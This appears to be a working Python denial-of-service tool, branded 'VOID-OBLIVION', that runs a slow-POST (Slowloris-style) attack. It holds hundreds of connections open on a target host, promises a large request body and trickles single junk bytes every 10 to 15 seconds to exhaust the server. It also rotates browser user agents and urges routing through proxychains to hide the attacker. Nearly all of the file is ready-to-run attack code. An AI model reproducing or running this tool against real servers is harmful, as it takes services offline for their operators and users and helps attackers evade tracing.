
Folder highlights
Scripts detail multiple Layer 7 attack methods: GoldenEye, HeavyPost, Doomsday, Phantom, and Oblivion, leveraging cache bypass and resource exhaustion.

import socket
import os
import sys
import time
import threading
import random
import string
import math
import ssl

# --- UI VOID TEAM ---
def rgb_text(text, offset):
    colored_chars = []
    FREQ = 0.1
    for i, char in enumerate(text):
        if char == '\n':
            colored_chars.append('\n')
            continue
        r = int(math.sin(FREQ * i + offset) * 127 + 128)
        g = int(math.sin(FREQ * i + offset + 2) * 127 + 128)
        b = int(math.sin(FREQ * i + offset + 4) * 127 + 128)
        colored_chars.append(f"\033[38;2;{r};{g};{b}m{char}")
    return "".join(colored_chars) + "\033[0m"

def get_logo():
    return r"""
 ░▒▓██████▓▒░      ▄▄██████▄▄      ░▒▓██████▓▒░
 ░▒▓██▓▒░        ▄████████████▄        ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▀▄ ▓▓ ▄▀ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▓▓ ▼▼ ▓▓ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░        ▀████████████▀        ░▒▓██▓▒░
  ░▒▓██▓▒░         ▀▀██████▀▀         ░▒▓██▓▒░
 
        ╔══════════════════════════════════╗
        ║    V O I D - O B L I V I O N     ║
        ╚══════════════════════════════════╝
           [ MODE: LOW & SLOW / STEALTH ]
    """

# --- STEALTH CONFIG ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
]

# List untuk menyimpan socket yang sedang "menyandera" server
list_of_sockets = []

def init_socket(target, port, ssl_on):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        
        if ssl_on:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target)
        
        s.connect((target, port))
        
        # --- TEKNIK OBLIVION ---
        # Kita kirim Header POST tapi TIDAK SELESAI.
        # Kita janji kirim 10.000 bytes (Content-Length).
        
        random_ua = random.choice(USER_AGENTS)
        
        header = (
            f"POST /?session={random.randint(1000,99999)} HTTP/1.1\r\n"
            f"Host: {target}\r\n"
            f"User-Agent: {random_ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 10000\r\n" # Janji palsu: "Saya mau kirim banyak data"
            f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
        )
        
        s.send(header.encode())
        return s
    except:
        return None

def run_ddos(key):
    if key != "VOID_ACCESS_GRANTED_2026":
        print("\033[1;31m[!] AKSES DITOLAK!\033[0m")
        return

    os.system('clear')
    print(rgb_text(get_logo(), 5))
    
    # Cek Proxychains
    is_proxy = False
    if "proxychains" in os.environ.get("_", "") or os.environ.get("LD_PRELOAD"):
        is_proxy = True
        print("\033[1;32m [✓] PROXYCHAINS: ACTIVE (GHOST MODE)\033[0m")
    else:
        print("\033[1;33m [!] WARNING: DIRECT MODE. USE PROXYCHAINS FOR TRUE STEALTH.\033[0m")

    target = input("\n\033[1;33m [?] Target Host (tanpa https://): \033[1;37m").strip()
    if not target: return
    
    port = int(input("\033[1;33m [?] Port (443/80): \033[1;37m") or 443)
    ssl_on = True if port == 443 else False
    
    # Jumlah socket = Jumlah kursi yang mau diduduki
    socket_count = int(input("\033[1;33m [?] Connections (Rec: 200-500): \033[1;37m") or 200)
    
    print(f"\n\033[1;31m [!] INFILTRATING {target} WITH {socket_count} GHOSTS...\033[0m")
    
    # 1. TAHAP INFILTRASI (Membuat Koneksi Awal)
    for i in range(socket_count):
        s = init_socket(target, port, ssl_on)
        if s:
            list_of_sockets.append(s)
            sys.stdout.write(f"\r\033[1;30m [*] Ghost created: {i+1}/{socket_count}\033[0m")
            sys.stdout.flush()
    
    print(f"\n\033[1;32m [✓] {len(list_of_sockets)} Ghosts are inside. Starting Slow Torture...\033[0m")
    
    # 2. TAHAP PENYIKSAAN (Keep-Alive Loop)
    while True:
        try:
            print(f"\033[1;36m [★] Sending keep-alive bytes to {len(list_of_sockets)} sockets...\033[0m")
            
            # Loop melalui semua socket yang hidup
            for s in list(list_of_sockets):
                try:
                    # Kirim SATU BYTE sampah acak
                    # Ini membuat server berpikir: "Oh, dia masih ngetik. Tunggu bentar."
                    junk = random.choice(string.ascii_letters).encode()
                    s.send(junk)
                except:
                    # Jika server memutus (timeout), socket mati.
                    list_of_sockets.remove(s)
            
            # 3. REGENERASI (Jika ada yang mati, buat baru)
            diff = socket_count - len(list_of_sockets)
            if diff > 0:
                print(f"\033[1;33m [!] {diff} Ghosts died. Reinforcing...\033[0m")
                for _ in range(diff):
                    s = init_socket(target, port, ssl_on)
                    if s:
                        list_of_sockets.append(s)
            
            # 4. TIDUR (Kunci Stealth)
            # Tidur 10-15 detik. Server dipaksa menunggu selama ini.
            # Ini yang bikin traffic terlihat KOSONG tapi server MATI.
            sleep_time = random.randint(10, 15)
            time.sleep(sleep_time)
            
        except KeyboardInterrupt:
            print("\n\033[1;31m [!] OBLIVION STOPPED.\033[0m")
            break
